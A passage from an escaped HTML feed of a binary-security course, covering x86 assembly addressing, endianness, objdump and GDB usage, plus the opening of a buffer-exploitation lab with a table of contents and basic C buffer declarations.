&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#000">cmp&lt;/span> &lt;span style="color:#000">rcx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">jb&lt;/span> &lt;span style="color:#000">for_loop&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; verify i &amp;lt; 10
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">; The code here is executed only after the loop ends.
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="dereferencing-addresses">Dereferencing Addresses&lt;/h1>
&lt;p>Up to this point we know how to operate with data and can write complex programs using conditional jumps.
But we know that data is stored mostly in the RAM.
How do we fetch it from there to our registers?&lt;/p>
&lt;p>Imagine the RAM is one giant array.
Each byte is a cell in this array.
Therefore, each byte is found at a given &lt;strong>index&lt;/strong> in this array.
Indices start at 0, so the first byte is found at index 0, the third 3 at index 2 and so on.
These indices are also called &lt;strong>memory addresses&lt;/strong>, or simply &lt;strong>addresses&lt;/strong>.&lt;/p>
&lt;p>In order to load data from the RAM into our registers or vice-versa, we need to specify to CPU which RAM address to access.
This is called &lt;strong>dereferencing that address&lt;/strong>.
Syntactically, this is very easy and is done by wrapping the address in &lt;code>[]&lt;/code>.
The address can be either a raw number, or a register, or an expression:&lt;/p>
&lt;pre tabindex="0">&lt;code>mov rax, [0xdeadbeef] ; load 8 bytes from the address 0xdeadbeef into rax
mov bx, [0xdeadbeef] ; load 2 bytes from the address 0xdeadbeef into bx
mov [0xdeadbeef], ecx ; store 4 bytes from ecx at the address 0xdeadbeef
&lt;/code>&lt;/pre>&lt;p>Notice that the number of bytes that are transferred between the RAM and registers is given by the size of the register.
But what happens when we don&amp;rsquo;t use a register?
The code below is incorrect because it is impossible to tell how many bytes to use to write 0x69.
We could write it using one byte of course, but what if we wanted to write it on 4 bytes and store &lt;code>[ 0x00 | 0x00 | 0x00 | 0x69 ]&lt;/code>?
To eliminate such ambiguities, we must specify the number of bytes that we want to write to the RAM:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xdeadbeef&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">byte&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x2&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; writes 1 byte
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xdeadbeef&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">word&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x2&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; writes 2 bytes: 0x00 and 0x02
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xdeadbeef&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">dword&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x2&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; writes 4 bytes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xdeadbeef&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">qword&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x2&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; writes 8 bytes
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Instead of a hardcoded value, we can express addresses as complex expressions which the CPU computes for us.
In the snippet below, the CPU computes the address given by &lt;code>rdi + rcx * 4&lt;/code> and then writes the contents of &lt;code>edx&lt;/code> there.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">rdi&lt;/span> &lt;span style="color:#a40000">+&lt;/span> &lt;span style="color:#000">rcx&lt;/span> &lt;span style="color:#000;font-weight:bold">*&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">edx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is equivalent to &lt;code>v[i] = something&lt;/code> where &lt;code>v&lt;/code> is an array of 4-byte values (hence &lt;code>rcx * 4&lt;/code>):&lt;/p>
&lt;ul>
&lt;li>&lt;code>rdi&lt;/code> = starting address of &lt;code>v&lt;/code>&lt;/li>
&lt;li>&lt;code>rcx&lt;/code> = &lt;code>i&lt;/code>&lt;/li>
&lt;li>&lt;code>edx&lt;/code> = &lt;code>something&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>Therefore, whenever you see &lt;code>[...]&lt;/code> in Assembly, what between the square brackets is being dereferenced &lt;a href="#lea">&lt;strong>with one exception&lt;/strong>&lt;/a>.&lt;/p>
&lt;h2 id="endianness">Endianness&lt;/h2>
&lt;p>This is all nice, but how does all this look like in the memory?
The order in which the bytes are stored in the RAM is called &lt;strong>endianness&lt;/strong>.
Most CPUs store bytes &lt;strong>in reverse order&lt;/strong>, or &lt;strong>little endian&lt;/strong> order, because the least significant byte is the first.
When data is fetched back from the ram, the order is reversed:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x100&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">dword&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x12345678&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; the RAM at 0x100: [ 0x78 | 0x56 | 0x34 | 0x12 ]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">ax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x100&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; ax = 0x5678
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">bx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">101&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; bx = 0x3456
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>However, endianness does not apply to strings.
The code below writes the string &lt;code>SSS Rulz&lt;/code> at the address 0x100.
Notice we don&amp;rsquo;t have to write it in reverse order like &lt;code>zluR SSS&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">&amp;#34;&lt;/span>&lt;span style="color:#000">SSS&lt;/span> &lt;span style="color:#000">Rulz&lt;/span>&lt;span style="color:#a40000">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x100&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">rax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">; We need to use a register because mov cannot take both an address and a 64-bit immediate as operands.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">; https://www.felixcloutier.com/x86/mov
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="reading-assembly">Reading Assembly&lt;/h1>
&lt;h2 id="objdump">&lt;code>objdump&lt;/code>&lt;/h2>
&lt;p>Starting from an executable file, we can read its Assembly code by &lt;strong>disassembling&lt;/strong> it.
The standard tool for doing this is &lt;code>objdump&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~$ objdump -M intel -d &amp;lt;binary&amp;gt; | less
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Use &lt;code>-M intel&lt;/code> for Intel syntax.
The default syntax is AT&amp;amp;T.&lt;/li>
&lt;li>&lt;code>-d&lt;/code> stands for &amp;ldquo;disassembly&amp;rdquo;.&lt;/li>
&lt;li>pipe the output to &lt;code>less&lt;/code> so you can navigate the Assembly code more easily.&lt;/li>
&lt;/ul>
&lt;p>Notice that every line contains an address, an opcode and an instruction.
The opcode is simply the binary representation of that instruction.&lt;/p>
&lt;p>Alternatively, you can use GDB and Ghidra that you learned about &lt;a href="../binary-analysis/">in the previous session&lt;/a>.&lt;/p>
&lt;h2 id="gdb">GDB&lt;/h2>
&lt;p>The undisputed king of Assembly is by far the &lt;strong>GNU DeBugger (GDB)&lt;/strong>.
It&amp;rsquo;s just what its name says it is, but its beauty is in its versatility.
GDB is a command-line debugger that allows us to print registers, variables, dump memory from any address, step through the code, go back through the call stack and much more.
Today we will only get a glimpse of its power.&lt;/p>
&lt;p>We are using the &lt;code>pwndbg&lt;/code> extension for GDB as it allows us to view the assembly code, stack (you&amp;rsquo;ll learn about it in the &lt;a href="../taming-the-stack/">next session&lt;/a>) and registers.
Follow the instructions &lt;a href="https://github.com/pwndbg/pwndbg#how">here&lt;/a> to install it if you haven&amp;rsquo;t done so already.&lt;/p>
&lt;p>GDB can run Assembly instructions one by one and stops after each instruction.
The current instruction is also clearly displayed.
Below is a reduced list of useful GDB commands to get you going.
Use it as a cheatsheet when you get stuck:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>start&lt;/code> = start running the program from &lt;code>main&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>list&lt;/code> = decompile and display C code
Only works for executables compiled with &lt;code>-g&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>pdis&lt;/code> = disassemble and display instructions with nice syntax highlighting&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>next&lt;/code> / &lt;code>n&lt;/code> = run the current C code
If it is a function call, it is executed without stepping into the function.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>nexti&lt;/code> / &lt;code>ni&lt;/code> = run the current Assembly instruction&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>step&lt;/code> / &lt;code>s&lt;/code> = if the debugger has reached a function call, step into it.
Otherwise, it behaves like &lt;code>next&lt;/code> / &lt;code>n&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>stepi&lt;/code> / &lt;code>si&lt;/code> = step into function (used for the &lt;code>call&lt;/code> instruction in Assembly)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>break&lt;/code> / &lt;code>b &amp;lt;n&amp;gt;&lt;/code> = place a breakpoint at line &lt;code>n&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>break&lt;/code> / &lt;code>b *&amp;lt;address&amp;gt;&lt;/code> = place breakpoint at address&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>continue&lt;/code> / &lt;code>c&lt;/code> = run code until next breakpoint&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>info registers &amp;lt;name&amp;gt;&lt;/code> = display the values in all registers.
If a name is specified, only the value in that register is displayed&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>p &amp;lt;variable&amp;gt;&lt;/code> / &lt;code>&amp;lt;name&amp;gt;&lt;/code> = print the variable / number; similar to &lt;code>printf&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>p/d = printf(&amp;#34;%d&amp;#34;)
p/c = printf(&amp;#34;%c&amp;#34;)
p/x = printf(“%x”)
p/u = printf(“%u”)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>x &amp;lt;address&amp;gt;&lt;/code> = print data at the address (dereference it).
By default, the output is represented in hex&lt;/li>
&lt;li>&lt;code>x/&amp;lt;n&amp;gt;&amp;lt;d&amp;gt;&amp;lt;f&amp;gt; &amp;lt;address&amp;gt;&lt;/code> -&amp;gt; print &lt;code>n&lt;/code> memory areas of size &lt;code>d&lt;/code> with format &lt;code>f&lt;/code>:&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>n = any number; default = 1
d = b (byte - default) / h (half-word = short) / w (word = int)
f = (like p): x (hex - default) / c (char) / d (int, decimal) / u (unsigned) / s (string)
&lt;/code>&lt;/pre>&lt;p>Examples:&lt;/p>
&lt;pre tabindex="0">&lt;code>x/20wx = 20 hex words (ints)
x/10hd = 10 decimal half-words (shortsuri)
x/10c = 10 ASCII characters
x/10b = 10 hex bytes (because x is the default)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>set $&amp;lt;register&amp;gt; &amp;lt;value&amp;gt;&lt;/code> = sets the register to that value&lt;/li>
&lt;/ul>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>The key takeaways from this session are:&lt;/p>
&lt;ul>
&lt;li>Assembly is a human-readable representation of instructions executed by the CPU&lt;/li>
&lt;li>It allows us to access CPU registers directly&lt;/li>
&lt;li>It uses a fixed set of instructions called ISA&lt;/li>
&lt;li>&lt;strong>Memory&lt;/strong> is the RAM, &lt;strong>storage&lt;/strong> is the disk&lt;/li>
&lt;li>Data is stored in memory using the little endian representation&lt;/li>
&lt;li>You can disassemble a program with &lt;code>objdump&lt;/code> like so: &lt;code>objdump -M intel -d &amp;lt;program&amp;gt; |less&lt;/code>&lt;/li>
&lt;/ul>
&lt;h1 id="activities">Activities&lt;/h1>
&lt;h2 id="in-plain-assembly">In Plain Assembly&lt;/h2>
&lt;p>The flag is almost right there in your face.&lt;/p>
&lt;h2 id="gotta-link-em-all">Gotta Link Em All&lt;/h2>
&lt;p>I wonder what hides in all those object files&amp;hellip;&lt;/p>
&lt;h2 id="jump-maze">Jump Maze&lt;/h2>
&lt;p>Theseus has nothing on you!
Navigate the maze and get the flag.&lt;/p>
&lt;h2 id="crypto">Crypto&lt;/h2>
&lt;p>Is it really about crypto?&lt;/p>
&lt;h2 id="call-me-little-sunshine">Call Me Little Sunshine&lt;/h2>
&lt;p>Do what the binary asks you to do.
What, it doesn&amp;rsquo;t work?&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;h2 id="the-whole-isa">The Whole ISA&lt;/h2>
&lt;p>If you want to search for an instruction, use &lt;a href="https://www.felixcloutier.com/x86/">this&lt;/a> website.
Each instruction has its own table with all possible operands and what they do.
Note that &lt;code>imm8&lt;/code> means &amp;ldquo;8-bit immediate&amp;rdquo;, i.e an 8-byte regular number, &lt;code>imm64&lt;/code> means a 64-bit immediate and so on.
Similarly, &lt;code>reg32&lt;/code> means a 32-bit register and &lt;code>m16&lt;/code> for example means a 16-bit (2-byte) memory area.
You&amp;rsquo;ll see &lt;code>reg&lt;/code>, &lt;code>imm&lt;/code> and &lt;code>m&lt;/code> combined with &lt;code>8&lt;/code>, &lt;code>16&lt;/code>, &lt;code>32&lt;/code> and &lt;code>64&lt;/code> depending on what each instruction does.&lt;/p>
&lt;h2 id="caches">Caches&lt;/h2>
&lt;p>Many programs access the same addresses repeatedly over a short period of time.
Take a short 1000-step loop.
It uses the same code 1000 times.
It would be inefficient for the CPU to read the instructions directly from the RAM 1000 times.
For this reason, there is an intermediary level of memory between the RAM and the registers, called &lt;strong>the cache&lt;/strong>.&lt;/p>
&lt;p>As their name implies, caches store the contents of some memory addresses that are frequently requested by the CPU.
We say &lt;em>caches&lt;/em>, in plural because they are laid out hierarchically, each lower level being faster and smaller than the ones below.
Usually, CPUs have 3 levels of cache memory.
You can query their sizes with the &lt;code>lscpu&lt;/code> command:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~$ lscpu
[...]
L1d cache: 128 KiB
L1i cache: 128 KiB
L2 cache: 1 MiB
L3 cache: 6 MiB
[...]
&lt;/code>&lt;/pre>&lt;p>Notice the L1 (level 1) cache is split between a data cache (&lt;code>L1d&lt;/code>) and an instruction cache &lt;code>L1i&lt;/code>.
The other caches do not store data and instructions separately.&lt;/p>
&lt;h2 id="assembly-syntaxes">Assembly Syntaxes&lt;/h2>
&lt;p>This session we&amp;rsquo;ve used the Intel syntax for writing and displaying Assembly.
We did so because it&amp;rsquo;s more straightforward than its alternative: the AT&amp;amp;T syntax.
You can find the differences on &lt;a href="https://en.wikipedia.org/wiki/X86_assembly_language#Syntax">Wikipedia&lt;/a>.&lt;/p>
&lt;h2 id="lea">&lt;code>lea&lt;/code>&lt;/h2>
&lt;p>&lt;code>lea&lt;/code> stands for &amp;ldquo;Load Effective Address&amp;rdquo;.
It syntax is:&lt;/p>
&lt;pre tabindex="0">&lt;code>lea dest, [address]
&lt;/code>&lt;/pre>&lt;p>It loads &lt;code>address&lt;/code> into the &lt;code>dest&lt;/code> register (it can only be a register).
What&amp;rsquo;s interesting about it is that it also uses the &lt;code>[...]&lt;/code> syntax, but &lt;strong>does not dereference the address&lt;/strong>.
In the snippet below, &lt;code>0xdeadbeef&lt;/code> is simply copied to &lt;code>rax&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>lea rax, [0xdeadbeef]
&lt;/code>&lt;/pre>&lt;p>Its true power comes from the fact that it can also compute an address.
For example, the code below will first compute the address given by &lt;code>rdi + rcx * 8 + 7&lt;/code> and then write this address into &lt;code>rax&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>lea rax, [rdi + rcx * 8 + 7]
&lt;/code>&lt;/pre></description></item><item><title>Essentials:</title><link>/essentials/taming-the-stack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/taming-the-stack/</guid><description>
&lt;h1 id="taming-the-stack">Taming the Stack&lt;/h1>
&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;p>Use &lt;a href="https://github.com/ekalinin/github-markdown-toc">gh-md-toc&lt;/a>.&lt;/p>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Objectives and rationale for the current session.&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;ul>
&lt;li>Information required for this section&lt;/li>
&lt;li>Commands / snippets that should be known, useful to copy-paste throughout the practical session&lt;/li>
&lt;/ul>
&lt;h2 id="content-sections">Content Sections:&lt;/h2>
&lt;ul>
&lt;li>Content split in sections, according to session specifics&lt;/li>
&lt;li>Demos will be part of the session presentation and will be referenced (snippets, images, links) in the content&lt;/li>
&lt;/ul>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;ul>
&lt;li>Sumamrizing session concepts&lt;/li>
&lt;li>Summarizing commands / snippets that are useful for tutorials, challenges (easy reference, copy-paste)&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
&lt;p>Tasks for the students to solve. They may be of two types:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Tutorials&lt;/strong> - simpler tasks accompanied by more detailed, walkthrough-like explanations&lt;/li>
&lt;li>&lt;strong>Challenges&lt;/strong> - the good stuff&lt;/li>
&lt;/ul>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;p>Any links or references to extra information.&lt;/p></description></item><item><title>Binary:</title><link>/binary/buffer-exploitation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/buffer-exploitation/</guid><description>
&lt;h1 id="buffer-exploitation">Buffer Exploitation&lt;/h1>
&lt;h1 id="table-of-contents">Table of Contents&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="#overview">Overview&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#pwntools">Pwntools&lt;/a>&lt;/li>
&lt;li>&lt;a href="#buffers">Buffers&lt;/a>&lt;/li>
&lt;li>&lt;a href="#stack-buffer-overflow">Stack buffer overflow&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#buffer-size-and-offset-identification">Buffer size and offset identification&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#static-analysis">Static Analysis&lt;/a>&lt;/li>
&lt;li>&lt;a href="#dynamic-analysis">Dynamic analysis&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#input-output-functions">Input-Output functions&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#challenges">Challenges&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#01-challenge-parrot">01. Challenge: Parrot&lt;/a>&lt;/li>
&lt;li>&lt;a href="#02-challenge-indexing">02. Challenge: Indexing&lt;/a>&lt;/li>
&lt;li>&lt;a href="#03-challenge-smashthestack-level7">03. Challenge: Smashthestack Level7&lt;/a>&lt;/li>
&lt;li>&lt;a href="#04-challenge-neighbourly">04. Challenge: Neighbourly&lt;/a>&lt;/li>
&lt;li>&lt;a href="#05-challenge-input-functions">05. Challenge: Input Functions&lt;/a>&lt;/li>
&lt;li>&lt;a href="#06-challenge-bonus-birds">06. Challenge: Bonus: Birds&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#further-reading">Further Reading&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="pwntools">Pwntools&lt;/h2>
&lt;p>In this lab we will be using the &lt;code>pwntools&lt;/code> python module to solve the tasks. Check outh the &lt;a href="../../extra/pwntools-intro/README.md">Pwntools Tutorial section&lt;/a>.&lt;/p>
&lt;h2 id="buffers">Buffers&lt;/h2>
&lt;p>A buffer is an area of contiguous data in memory, determined by a starting address, contents and length. Understanding how buffers are used (or misused) is vital for both offensive and defensive purposes.
In C, we can declare a buffer of bytes as a char array, as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">local_buffer&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">32&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Which results in the following assembly code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-nasm" data-lang="nasm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">push&lt;/span> &lt;span style="color:#204a87">rbp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#204a87">rbp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#204a87">rsp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">sub&lt;/span> &lt;span style="color:#204a87">rsp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x20&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">ret&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that buffer allocation is done by simply subtracting its intended size from the current stack pointer (&lt;code>sub rsp, 0x20&lt;/code>). This simply reserves space on the stack (remember that on x86 the stack grows “upwards”, from higher addresses to lower ones).&lt;/p>
&lt;blockquote>
&lt;p>A compiler may allocate more space on the stack than explicitly required due to alignment constraints or other hidden values. To exploit a program, the C source code may not be a good enough reference point for stack offsets. Only disassembling the executable will provide relevant information.&lt;/p>
&lt;/blockquote>
&lt;p>Buffers can be also be stored in other places in memory, such as the heap, &lt;code>.bss&lt;/code>, &lt;code>.data&lt;/code> or &lt;code>.rodata&lt;/code>.&lt;/p>
&lt;p>Analyze and compile the following snippet (also present in the lab files, go to &lt;code>00-tutorial&lt;/code> and run &lt;code>make buffers&lt;/code>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#include&lt;/span> &lt;span style="color:#8f5902;font-style:italic">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">g_buf_init_zero&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">32&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">/* g_buf_init_vals[5..31] will be 0 */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">g_buf_init_vals&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">32&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">3&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">5&lt;/span>&lt;span style="color:#000;font-weight:bold">};&lt;/span>
